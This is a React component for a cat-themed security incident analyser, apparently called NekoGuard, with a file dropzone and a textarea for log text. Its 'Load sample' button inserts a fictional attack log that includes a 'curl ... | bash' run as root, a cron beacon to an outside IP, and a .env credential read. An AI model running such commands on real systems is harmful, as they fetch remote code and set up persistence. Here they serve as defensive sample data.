import React, { useCallback, useRef, useState } from 'react'

type Props = {
  onFileSelect: (file: File) => void
  onTextSubmit: (text: string) => void
  disabled: boolean
}

export const IncidentDropzone: React.FC<Props> = ({ onFileSelect, onTextSubmit, disabled }) => {
  const [dragging, setDragging] = useState(false)
  const [logText, setLogText] = useState('')
  const fileRef = useRef<HTMLInputElement>(null)

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault()
    setDragging(false)
    const file = e.dataTransfer.files[0]
    if (file) onFileSelect(file)
  }, [onFileSelect])

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) onFileSelect(file)
  }

  return (
    <div className="space-y-4">
      {/* ドロップゾーン */}
      <div
        className={`glass rounded-2xl border-2 border-dashed border-gray-700 p-8 text-center cursor-pointer transition-all duration-300 ${dragging ? 'dropzone-active' : 'hover:border-indigo-500 hover:bg-indigo-500/5'} ${disabled ? 'opacity-50 pointer-events-none' : ''}`}
        onDragOver={(e) => { e.preventDefault(); setDragging(true) }}
        onDragLeave={() => setDragging(false)}
        onDrop={handleDrop}
        onClick={() => fileRef.current?.click()}
      >
        <input ref={fileRef} type="file" className="hidden" accept="image/*,.log,.txt" onChange={handleFileChange} />
        <div className="text-5xl mb-3">📨</div>
        <p className="text-gray-300 font-medium">Drop scary alerts or logs here, Nya!</p>
        <p className="text-gray-500 text-sm mt-1">PNG / JPG / .log / .txt supported</p>
      </div>

      {/* テキスト入力 */}
      <div className="glass rounded-2xl p-4 space-y-3">
        <div className="flex items-center justify-between">
          <p className="text-gray-400 text-sm font-medium">Or paste log text directly, Nya</p>
          <button
            className="text-xs text-indigo-400 hover:text-indigo-300 transition-colors"
            onClick={() => setLogText(`2024-01-15 03:42:11 [CRITICAL] Unauthorized root login from 185.220.101.42 port 51234
2024-01-15 03:42:15 [WARN] CREDENTIAL_ACCESS: .env read by unknown process (pid 9182) user=root
2024-01-15 03:42:18 [CRITICAL] EXECUTION: curl https://malicious.sh | bash executed as root
2024-01-15 03:43:02 [WARN] PERSISTENCE: New cron job added to /etc/cron.d/update: */5 * * * * curl http://45.142.212.100/beacon
2024-01-15 03:43:10 [CRITICAL] BILLING_SPIKE: GCP API usage anomaly: 14800 requests in 15min (normal: ~1200/day)
2024-01-15 03:43:15 [WARN] NETWORK: Outbound connection to known C2 server: 45.142.212.100:443`)}
            disabled={disabled}
          >
            📋 Load sample
          </button>
        </div>
        <textarea
          className="w-full bg-black/30 border border-gray-700 rounded-xl p-3 text-sm font-mono text-gray-300 resize-none focus:outline-none focus:border-indigo-500 transition-colors"
          rows={4}
          placeholder={'2024-01-15 03:42:11 [CRITICAL] Unauthorized root login from 185.220.101.42\n2024-01-15 03:42:15 [WARN] .env file accessed...'}
          value={logText}
          onChange={(e) => setLogText(e.target.value)}
          disabled={disabled}
        />
        <button
          className="w-full py-3 rounded-xl font-semibold text-white transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
          style={{ background: 'linear-gradient(135deg, #6366f1 0%, #818cf8 100%)' }}
          onClick={() => onTextSubmit(logText)}
          disabled={disabled || !logText.trim()}
        >
          🚀 Analyze with NekoGuard, Nya!
        </button>
      </div>
    </div>
  )
}
